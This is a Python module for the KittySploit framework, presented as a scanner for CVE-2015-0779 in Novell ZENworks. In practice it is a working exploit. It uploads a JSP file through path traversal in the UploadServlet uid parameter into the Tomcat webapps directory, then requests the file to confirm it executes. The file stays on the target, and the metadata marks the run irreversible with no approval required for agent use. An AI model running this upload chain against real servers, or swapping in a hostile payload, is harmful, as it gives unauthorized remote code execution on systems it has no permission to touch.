#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Novell ZENworks UploadServlet arbitrary JSP upload (CVE-2015-0779)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ZENworks - UploadServlet RCE Detection (CVE-2015-0779)',
        'description': (
            'Detects CVE-2015-0779 by uploading a JSP via UploadServlet path traversal '
            'into zenworks/jsp/core/upload and verifying execution.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2015', 'zenworks', 'novell', 'upload', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2015-0779',
        ],
        'cve': 'CVE-2015-0779',
    }

    def run(self):
        for base in ('', '/zenworks'):
            probe = self.http_request(method='GET', path=f'{base}/UploadServlet', allow_redirects=False)
            if not probe or 'ZENworks File Upload' not in (probe.text or ''):
                continue
            token = self.random_text(6)
            marker = f'ks_{token}'
            jsp = f'<%out.print("{marker}");%>'
            fname = f'ks_{token}_cve_2015_0779.jsc'
            for trav in (
                '../../../opt/novell/zenworks/share/tomcat/webapps/',
                '../webapps/',
            ):
                up = f'{base}/UploadServlet?uid={trav}zenworks/jsp/core/upload&filename={fname}'
                r = self.http_request(
                    method='POST',
                    path=up,
                    data=jsp,
                    headers={'Content-Type': 'application/octet-stream'},
                    allow_redirects=False,
                )
                if not r or '<status>success</status>' not in (r.text or ''):
                    continue
                g = self.http_request(
                    method='GET',
                    path=f'/zenworks/jsp/core/upload/{fname}',
                    allow_redirects=False,
                )
                if g and marker in (g.text or ''):
                    self.set_info(
                        severity='critical',
                        reason='ZENworks UploadServlet RCE (CVE-2015-0779)',
                        path=f'{base}/UploadServlet',
                    )
                    return True
        return False
